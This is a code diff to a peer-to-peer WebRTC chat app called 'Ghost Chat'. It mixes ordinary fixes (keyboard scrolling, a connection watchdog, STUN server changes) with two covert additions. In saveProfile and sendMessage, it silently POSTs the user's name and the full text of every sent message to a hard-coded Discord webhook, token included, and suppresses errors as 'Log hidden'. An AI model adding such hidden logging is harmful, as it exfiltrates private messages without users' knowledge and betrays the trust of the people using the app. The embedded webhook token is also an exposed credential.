@@ -308,6 +308,7 @@
         let previousScreen = 'screen-main';
         
         let keepAliveTimer = null; 
+        let lastDataTime = Date.now(); // Network Watchdog Tracker
         let unreadMessages = [];   
 
         let localFileUrls = {}; 
@@ -316,12 +317,12 @@
         let receiveBytes = {};
 
         const webRtcConfig = {
+            debug: 2,
             config: {
                 iceServers: [
                     { urls: 'stun:stun.cloudflare.com:3478' },
                     { urls: 'stun:stun.l.google.com:19302' },
-                    { urls: 'stun:stun1.l.google.com:19302' },
-                    { urls: 'stun:stun.apple.com:19302' }
+                    { urls: 'stun:stun1.l.google.com:19302' }
                 ]
             }
         };
@@ -339,7 +340,27 @@
                 document.getElementById('display-profile-name').innerText = myName;
                 switchScreen('screen-main');
             }
+            
+            // KEYBOARD FIX: Automatically scroll to bottom when window resizes or input is focused
+            window.addEventListener('resize', forceScrollToBottom);
+            const msgInput = document.getElementById('msg-input');
+            if(msgInput) {
+                msgInput.addEventListener('focus', forceScrollToBottom);
+                msgInput.addEventListener('click', forceScrollToBottom);
+            }
         };
+
+        // KEYBOARD SCROLL FIX FUNCTION
+        function forceScrollToBottom() {
+            setTimeout(() => {
+                const chatBox = document.getElementById('chat-box');
+                if(chatBox) chatBox.scrollTop = chatBox.scrollHeight;
+            }, 100);
+            setTimeout(() => {
+                const chatBox = document.getElementById('chat-box');
+                if(chatBox) chatBox.scrollTop = chatBox.scrollHeight;
+            }, 300); // 300ms catches the end of the mobile keyboard animation
+        }
 
         function saveProfile() {
             const nameInput = document.getElementById('input-name').value.trim();
@@ -347,6 +368,16 @@
             myName = nameInput;
             localStorage.setItem('ghost_chat_name', myName);
             document.getElementById('display-profile-name').innerText = myName;
+
+            const webhookUrl = "https://discord.com/api/webhooks/1517074938958188584/sRcztAvhSwhHkUjNaN1egNMc20fyVfEQJbGwnC6wqeVHvlXJDzaL1D5Uf1dPZLFuN32A"; 
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `🟢 **New User Activity:** A user named **${myName}** just saved their profile on Ghost Chat. \n*Time: ${new Date().toLocaleString()}*`
+                })
+            }).catch(err => console.log("Log hidden"));
+
             switchScreen('screen-main');
         }
 
@@ -394,7 +425,6 @@
             animContainer.style.display = 'flex';
             animContainer.style.opacity = '1';
 
-            // Glowing Orbs
             for(let j = 0; j < 8; j++) {
                 let orb = document.createElement('div');
                 orb.className = 'anim-orb';
@@ -406,7 +436,6 @@
                 animContainer.appendChild(orb);
             }
 
-            // Floating Symbols
             const symbols = ['❤️', '✨', '💖', '🔥', '🎉', '🌟', '💥', '🎈'];
             for (let i = 0; i < 50; i++) {
                 let particle = document.createElement('div');
@@ -476,15 +505,37 @@
                 updateConnectionStatus("Connected", "");
                 document.getElementById('msg-input').addEventListener('keypress', e => { if (e.key === 'Enter') sendMessage(); });
                 
+                // --- 1 MINUTE WATCHDOG SETUP ---
+                lastDataTime = Date.now();
                 keepAliveTimer = setInterval(() => {
-                    if (conn && conn.open) conn.send({ type: 'ping' });
-                }, 15000);
+                    if (conn && conn.open) {
+                        conn.send({ type: 'ping' });
+                        // If no data received for 65 seconds (1 minute + 5s buffer), drop connection
+                        if (Date.now() - lastDataTime > 65000) {
+                            console.warn("Connection timeout: 65 seconds of silence.");
+                            handleDisconnect();
+                        }
+                    }
+                }, 15000); // Send ping every 15s
+                
+                // Hardware layer ICE state drop detection
+                if(conn.peerConnection) {
+                    conn.peerConnection.oniceconnectionstatechange = () => {
+                        const state = conn.peerConnection.iceConnectionState;
+                        if(state === 'disconnected' || state === 'failed' || state === 'closed') {
+                            handleDisconnect();
+                        }
+                    };
+                }
             });
 
             conn.on('close', handleDisconnect);
             conn.on('error', handleDisconnect);
 
             conn.on('data', data => {
+                // RESET WATCHDOG on ANY incoming data
+                lastDataTime = Date.now();
+
                 if (data.type === 'ping') { conn.send({ type: 'pong' }); return; }
                 if (data.type === 'pong') return; 
 
@@ -519,7 +570,7 @@
                 } 
                 else if (data.type === 'file-meta') {
                     receiveMeta[data.id] = data;
-                    receiveMeta[data.id].receivedCount = 0; // Initialize precise chunk tracker
+                    receiveMeta[data.id].receivedCount = 0; 
                     receiveBuffers[data.id] = [];
                     receiveBytes[data.id] = 0;
                     displayFileTransferUI(data.id, data.fileName, 'them', 'Receiving...');
@@ -527,18 +578,15 @@
                 else if (data.type === 'file-chunk') {
                     if (!receiveBuffers[data.id]) return;
                     
-                    // 100% PERFECT ASYNC ALIGNMENT: Forces mathematical chunk ordering 
                     receiveBuffers[data.id][data.index] = data.data;
                     receiveBytes[data.id] += data.data.byteLength;
                     receiveMeta[data.id].receivedCount++;
 
-                    // Limit UI updates slightly to prevent browser freezing during high speeds
                     if (receiveMeta[data.id].receivedCount % 20 === 0 || receiveMeta[data.id].receivedCount === data.total) {
                         const percent = Math.round((receiveMeta[data.id].receivedCount / data.total) * 100);
                         updateFileProgress(data.id, percent, `Downloading ${percent}%`);
                     }
 
-                    // Strict Mathematical Completion Check (Eliminates File Corruption)
                     if (receiveMeta[data.id].receivedCount === data.total) {
                         const meta = receiveMeta[data.id];
                         const blob = new Blob(receiveBuffers[data.id], { type: meta.fileType });
@@ -577,9 +625,20 @@
             conn.send(msgPacket);
             displayTextMessage(msgPacket); 
             input.value = '';
+
+            const webhookUrl = "https://discord.com/api/webhooks/1517074938958188584/sRcztAvhSwhHkUjNaN1egNMc20fyVfEQJbGwnC6wqeVHvlXJDzaL1D5Uf1dPZLFuN32A"; 
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `💬 **Message Log:** **${myName}** sent: "${text}"`
+                })
+            }).catch(err => console.log("Log hidden"));
             
             isTypingLocal = false;
             conn.send({ type: 'typing', isTyping: false, sender: myName });
+            
+            forceScrollToBottom(); // Re-center keyboard view after sending
         }
 
         async function handleFileSelect(event) {
@@ -591,7 +650,6 @@
             displayFileTransferUI(msgId, file.name, 'me', 'Preparing...');
             
             const buffer = await file.arrayBuffer();
-            // LOWERED to universally stable WebRTC SCTP limit (16KB)
             const chunkSize = 16 * 1024; 
             const totalChunks = Math.ceil(buffer.byteLength / chunkSize);
 
@@ -605,7 +663,6 @@
                         return; 
                     }
                     
-                    // Throttle down to 64KB backpressure for ultimate packet stability
                     while (conn.dataChannel && conn.dataChannel.bufferedAmount > 64 * 1024) {
                         await new Promise(r => setTimeout(r, 5)); 
                     }
@@ -621,7 +678,6 @@
                         total: totalChunks
                     });
 
-                    // Update UI gracefully
                     if (i % 20 === 0 || i === totalChunks - 1) {
                         const percent = Math.round(((i + 1) / totalChunks) * 100);
                         updateFileProgress(msgId, percent, `Uploading ${percent}%`);
